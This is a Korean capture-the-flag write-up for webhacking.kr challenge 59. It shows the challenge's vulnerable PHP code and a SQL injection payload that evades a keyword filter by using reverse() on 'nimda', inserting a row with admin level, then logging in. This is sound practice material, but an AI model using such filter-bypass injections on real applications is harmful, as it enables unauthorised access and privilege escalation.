================================================================================================================
[webhacking.kr] 59
================================================================================================================


.. uml::
	
	@startuml

	start

	:Source analysis;

	:Filtering Bypass;

	stop

	@enduml

|

Source analysis
================================================================================================================

접근하면 하나의 웹 페이지가 뜨게 되는데 소스를 클릭하면 소스 내용을 확인할 수 있습니다.

.. code-block:: php

	<?

	if($_POST[lid] && $_POST[lphone])
	{
	$q=@mysql_fetch_array(mysql_query("select id,lv from c59 where id='$_POST[lid]' and phone='$_POST[lphone]'"));

	if($q[id])
	{

	echo("id : $q[id]<br>lv : $q[lv]<br><br>");

	if($q[lv]=="admin")
	{
	@mysql_query("delete from c59");
	@clear();
	}

	echo("<br><a href=index.php>back</a>");
	exit();
	}

	}


	if($_POST[id] && $_POST[phone])
	{
	if(strlen($_POST[phone])>=20) exit("Access Denied");
	if(eregi("admin",$_POST[id])) exit("Access Denied");
	if(eregi("admin|0x|#|hex|char|ascii|ord|from|select|union",$_POST[phone])) exit("Access Denied");

	@mysql_query("insert into c59 values('$_POST[id]',$_POST[phone],'guest')");
	}

	?>
	<html><head><title>Challenge 59</title></head><body>
	<form method=post action=index.php>
	<table border=1>
	<tr><td>JOIN</td><td><input name=id></td><td><input name=phone></td><td><input type=submit></td></tr>
	<tr><td>LOGIN</td><td><input name=lid></td><td><input name=lphone></td><td><input type=submit></td></tr>
	</form>
	</body></html>


목표는 JOIN을 통해 admin 계정을 생성하고, LOGIN을 통해 해당 계정으로 로그인을 진행하는 것입니다.

JOIN에 대한 소스 내용을 보시면 파라미터 값들이 eregi를 통해 특정 문자열에 대해 필터링이 되어 있습니다. 
그리고, 자신의 권한에 해당하는 값에 guest라는 문자열로 박혀있습니다.

|

Filtering Bypass
================================================================================================================

admin 문자열에 대해 필터링이 걸려있기 때문에, reverse 함수를 이용하여 admin 문자열을 거꾸로 입력하는 방식을 사용합니다.

.. code-block:: javascript

    $_POST[id] = nimda
    $_POST[phone] = 1,reverse(id)),(1,1

    "insert into c59 values('nimda',1,reverse(id)),(1,1,'guest')"

계정 추가가 성공적으로 되면 nimda 계정으로 로그인하면 Clear!!

.. code-block:: python

    $_POST[lid] = nimda
    $_POST[lphone] = 1

    "select id,lv from c59 where id='nimda' and phone='1'"
